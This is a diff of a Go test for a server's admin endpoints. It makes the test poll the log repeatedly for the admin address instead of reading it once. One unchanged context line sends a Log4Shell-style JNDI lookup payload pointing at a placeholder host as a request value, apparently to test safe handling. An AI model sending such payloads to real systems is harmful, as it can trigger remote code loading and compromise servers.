@@ -188,13 +188,19 @@ func TestAdminEndpoints(t *testing.T) {
 	do("http://"+addr+"/", "curl/8")
 	do("http://"+addr+"/", "${jndi:ldap://x.invalid/a}")
 
-	// The admin address is announced in the log (the port was chosen by the OS).
+	// The admin address is announced in the log (the port was chosen by the OS),
+	// shortly after the main listener is up, so wait for it.
 	var admin string
-	for _, line := range strings.Split(errb.String(), "\n") {
-		if strings.Contains(line, `"msg":"admin endpoints"`) {
-			var rec struct{ Addr string }
-			_ = json.Unmarshal([]byte(line), &rec)
-			admin = rec.Addr
+	for i := 0; i < 200 && admin == ""; i++ {
+		for _, line := range strings.Split(errb.String(), "\n") {
+			if strings.Contains(line, `"msg":"admin endpoints"`) {
+				var rec struct{ Addr string }
+				_ = json.Unmarshal([]byte(line), &rec)
+				admin = rec.Addr
+			}
+		}
+		if admin == "" {
+			time.Sleep(25 * time.Millisecond)
 		}
 	}
 	if admin == "" {
